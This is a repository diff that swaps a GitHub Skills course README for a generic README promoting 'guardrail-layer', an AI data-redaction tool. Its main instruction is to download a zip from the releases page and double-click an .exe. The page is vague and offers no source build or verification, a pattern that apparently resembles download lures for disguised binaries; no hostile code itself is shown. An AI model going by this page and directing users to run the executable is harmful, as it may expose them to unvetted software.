@@ -1,75 +1,70 @@
-<header>
+# 🎉 guardrail-layer - Secure Your AI Data Effortlessly
 
-<!--
-  <<< Author notes: Course header >>>
-  Include a 1280×640 image, course title in sentence case, and a concise description in emphasis.
-  In your repository settings: enable template repository, add your 1280×640 social image, auto delete head branches.
-  Add your open source license, GitHub uses MIT license.
--->
+## 🚀 Getting Started
 
-# Introduction to GitHub
+Welcome to guardrail-layer! This tool helps you keep your AI database secure with smart redactions and helpful query generation. Let’s make sure your data stays private while you enjoy the power of AI.
 
-_Get started using GitHub in less than an hour._
+## 🔗 Download Now
 
-</header>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/AakarshakKaushal00/guardrail-layer/releases)
 
-<!--
-  <<< Author notes: Step 1 >>>
-  Choose 3-5 steps for your course.
-  The first step is always the hardest, so pick something easy!
-  Link to docs.github.com for further explanations.
-  Encourage users to open new tabs for steps!
--->
+## 📥 Download & Install
 
-## Step 1: Create a branch
+To get started, visit the [Releases page](https://github.com/AakarshakKaushal00/guardrail-layer/releases) to download guardrail-layer. Follow these simple steps to install the application on your computer.
 
-_Welcome to "Introduction to GitHub"! :wave:_
+### 1. Choose Your Version
 
-**What is GitHub?**: GitHub is a collaboration platform that uses _[Git](https://docs.github.com/get-started/quickstart/github-glossary#git)_ for versioning. GitHub is a popular place to share and contribute to [open-source](https://docs.github.com/get-started/quickstart/github-glossary#open-source) software.
-<br>:tv: [Video: What is GitHub?](https://www.youtube.com/watch?v=pBy1zgt0XPc)
+On the Releases page, you’ll see different versions of guardrail-layer. Always download the latest version for the best features and security. Click on the link that says “Download” to start your download.
 
-**What is a repository?**: A _[repository](https://docs.github.com/get-started/quickstart/github-glossary#repository)_ is a project containing files and folders. A repository tracks versions of files and folders. For more information, see "[About repositories](https://docs.github.com/en/repositories/creating-and-managing-repositories/about-repositories)" from GitHub Docs.
+### 2. Locate the Downloaded File
 
-**What is a branch?**: A _[branch](https://docs.github.com/en/get-started/quickstart/github-glossary#branch)_ is a parallel version of your repository. By default, your repository has one branch named `main` and it is considered to be the definitive branch. Creating additional branches allows you to copy the `main` branch of your repository and safely make any changes without disrupting the main project. Many people use branches to work on specific features without affecting any other parts of the project.
+Once the download is complete, find the file in your computer’s Downloads folder (or wherever you save downloaded files). The file name will look something like `guardrail-layer-v1.0.zip`.
 
-Branches allow you to separate your work from the `main` branch. In other words, everyone's work is safe while you contribute. For more information, see "[About branches](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-branches)".
+### 3. Extract the Files
 
-**What is a profile README?**: A _[profile README](https://docs.github.com/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme)_ is essentially an "About me" section on your GitHub profile where you can share information about yourself with the community on GitHub.com. GitHub shows your profile README at the top of your profile page. For more information, see "[Managing your profile README](https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme)".
+The downloaded file is likely zipped for easier sharing. Here’s how to extract it:
 
-![profile-readme-example](/images/profile-readme-example.png)
+- Right-click the downloaded `.zip` file.
+- Select “Extract All” from the menu.
+- Follow any prompts that appear to complete the extraction.
 
-### :keyboard: Activity: Your first branch
+### 4. Open the Application
 
-1. Open a new browser tab and navigate to your newly made repository. Then, work on the steps in your second tab while you read the instructions in this tab.
-2. Navigate to the **< > Code** tab in the header menu of your repository.
+Once the files are extracted, you will see a new folder named `guardrail-layer`. Open this folder, and you will find an application file named `guardrail-layer.exe` (or similar). Double-click on this file to launch the application.
 
-   ![code-tab](/images/code-tab.png)
+### 5. Follow the On-Screen Instructions
 
-3. Click on the **main** branch drop-down.
+When you open guardrail-layer for the first time, you may see a welcome message or setup guide. Follow the easy on-screen instructions to configure your application. This will usually involve setting up your database connection and basic preferences.
 
-   ![main-branch-dropdown](/images/main-branch-dropdown.png)
+## 💡 Features
 
-4. In the field, name your branch `my-first-branch`. In this case, the name must be `my-first-branch` to trigger the course workflow.
-5. Click **Create branch: my-first-branch** to create your branch.
+guardrail-layer comes with several features to enhance your experience:
 
-   ![create-branch-button](/images/create-branch-button.png)
+- **Data Redaction:** Automatically remove sensitive information from your AI queries and responses.
+- **Metadata-Aware Queries:** Generate queries that adapt based on your data context.
+- **Built-in Chat:** Communicate through an integrated chat interface for seamless interaction.
+- **Self-hosted Solution:** Manage your installation locally for enhanced privacy and security.
 
-   The branch will automatically switch to the one you have just created.
-   The **main** branch drop-down bar will reflect your new branch and display the new branch name.
+## 📋 System Requirements
 
-6. Wait about 20 seconds then refresh this page (the one you're following instructions from). [GitHub Actions](https://docs.github.com/en/actions) will automatically update to the next step.
+We recommend the following system setup to run guardrail-layer effectively:
 
-<footer>
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** 1 GB of free disk space for installation and data.
 
-<!--
-  <<< Author notes: Footer >>>
-  Add a link to get support, GitHub status page, code of conduct, license link.
--->
+## 💬 Support
 
----
+Having trouble? You’re not alone. Common questions are covered in the FAQ section on our [GitHub page](https://github.com/AakarshakKaushal00/guardrail-layer/issues). 
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/introduction-to-github) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+If you need further assistance, feel free to post a question there, and our community will help you out.
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+## 🌟 Contributing
 
-</footer>
+We welcome contributions! If you have ideas for new features or enhancements, consider checking the [issues](https://github.com/AakarshakKaushal00/guardrail-layer/issues) to see what others are working on. You can also fork the repository and submit your changes.
+
+## 🎉 Thanks for Using guardrail-layer!
+
+We hope you enjoy using guardrail-layer as much as we enjoyed building it. Keep your data safe and enjoy the benefits of AI with ease!
+
+For more information or to return to the download page, visit [this link](https://github.com/AakarshakKaushal00/guardrail-layer/releases).
